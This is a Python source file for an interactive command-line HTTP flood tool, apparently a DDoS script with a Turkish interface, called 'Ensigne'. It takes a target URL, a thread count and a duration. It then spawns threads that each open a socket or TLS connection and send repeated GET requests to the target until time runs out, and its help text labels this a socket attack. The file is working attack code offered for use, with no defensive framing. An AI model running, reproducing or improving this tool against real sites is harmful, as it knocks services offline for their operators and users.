# Kütüphaneler

from time import sleep
from colorama import Fore, Back, Style
from sys import stdout
from os import system, name
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver

# Header

def header(): 
    print(Fore.LIGHTCYAN_EX + """
    ╔╗                     ╔╗             ╔═══╗ ╔╗  ╔╗          ╔╗      
    ║║                     ║║             ║╔═╗║╔╝╚╗╔╝╚╗         ║║      
    ║║   ╔══╗╔══╗╔══╗╔═╗ ╔═╝║╔══╗ ╔═╗╔╗ ╔╗║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗╔══╗
    ║║ ╔╗║╔╗║║╔╗║║╔╗║║╔╗╗║╔╗║╚ ╗║ ║╔╝║║ ║║║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝║══╣
    ║╚═╝║║║═╣║╚╝║║║═╣║║║║║╚╝║║╚╝╚╗║║ ║╚═╝║║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╠══║
    ╚═══╝╚══╝╚═╗║╚══╝╚╝╚╝╚══╝╚═══╝╚╝ ╚═╗╔╝╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝
            ╔═╝║                    ╔═╝║                               
            ╚══╝                    ╚══╝                               

    """)

sleep(1)

print(header)
# Komutlar


def komut():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"Ensigne"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    komut = input()
    clear()

    # Cls
    if komut == "cls":
        clear()
    # Cls2
    elif komut == "clear":
        clear()
    # Yardim
    elif komut == "yardim":
        yardim()
    # Soc
    elif komut == "socket":
        clear()
        header()
        sleep(1)
        target, thread, t = bilgi_cek()
        timer = threading.Thread(target=zamanlayici, args=(t,))
        timer.start()
        Socketİsleyis(target, thread, t)
        timer.join()
    # Geliştiriciler
    elif komut == "gelistiriciler":
        gelistirici()


# Komut İşlem

# Geliştiricler

def gelistirici():
    stdout.write("\x1b[38;2;0;236;250m╔══════════════════════════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "Yağız | Discord:  Yağız:3953  \n")
    stdout.write("\x1b[38;2;0;236;250m╚══════════════════════════════════════════════╝\n")
    stdout.write("\n")

# Temizleme
def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')

# Yardım
def yardim():
    stdout.write("\x1b[38;2;0;236;250m╔══════════════════════════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "socket = Socket saldırısı yapar.  \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "yardim = Komutları ve açıklamalarını gösterir.  \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "gelistirici = Geliştiricileri gösterir.  \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   + "cikis" + Fore.WHITE + " = Tooldan çıkış yapar.   \n")
    stdout.write("\x1b[38;2;0;236;250m╚══════════════════════════════════════════════╝\n")
    stdout.write("\n")


# Bilgi

def bilgi_cek():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL Adresi    "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"SÜRE(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t


# Zamanlayıcı

def zamanlayici(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Saldırı bitimine => " + str((until - datetime.datetime.now()).total_seconds()) + " saniye kaldı")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Saldırı tamamlandı!                                   \n")
            return


# Socket

def Socketİsleyis(url, th, t):
    target = hedef_cek(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=SaldiriSocket, args=(target, until, req))
            thd.start()
        except:
            pass

def SaldiriSocket(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


def hedef_cek(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

if __name__ == '__main__':
    clear()
    header()
    while True:
        komut()
